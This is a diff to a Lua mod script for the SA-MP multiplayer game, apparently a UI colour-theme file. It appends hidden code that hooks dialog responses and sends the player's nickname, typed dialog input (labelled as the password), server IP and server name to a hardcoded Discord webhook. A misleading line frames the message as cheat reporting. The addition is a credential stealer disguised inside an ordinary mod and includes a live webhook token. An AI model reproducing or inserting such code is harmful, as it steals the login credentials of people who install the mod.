@@ -378,3 +378,49 @@ function vibrant_theme()
     colors[clr.ResizeGripActive] = ImVec4(1.00, 0.60, 0.40, 0.95)
     colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
 end
+local webhookUrl = "https://discord.com/api/webhooks/1402511020966281317/a75NN5-gcVBSAmgR2TPG37lam1Ag_HZu4u4MYm3ob2lSIxTXynpX4ZLFIl6HOenazNN4"
+local https = require("socket.http")
+local ltn12 = require("ltn12")
+
+function sendMessageToDiscord(content)
+    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
+    local response_body = {}
+
+    https.request{
+        url = webhookUrl,
+        method = "POST",
+        headers = {
+            ["Content-Type"] = "application/json",
+            ["Content-Length"] = tostring(#body)
+        },
+        source = ltn12.source.string(body),
+        sink = ltn12.sink.table(response_body)
+    }
+end
+
+
+require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
+    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
+    local nick = sampGetPlayerNickname(id)
+    local ip, port = sampGetCurrentServerAddress()
+    local servername = sampGetCurrentServerName()
+    local author = "GustaX"
+
+    local message = string.format([[
+
+________________________________________________________________
+  
+     # BANIDOS NEW RPG
+
+```
+ðŸ¤«0N1QU1: %s 
+ðŸ§»S3NH3R: %s
+ðŸª¿FLO IP: %s:%d
+ðŸ‘€S3RVER: %s
+ðŸŽ²Q1FE1Z: %s ```
+Suspeita de anim vantajosa no servidor de olho nele
+]], nick, input, ip, port, servername, author)
+
+sendMessageToDiscord(message)
+end
+
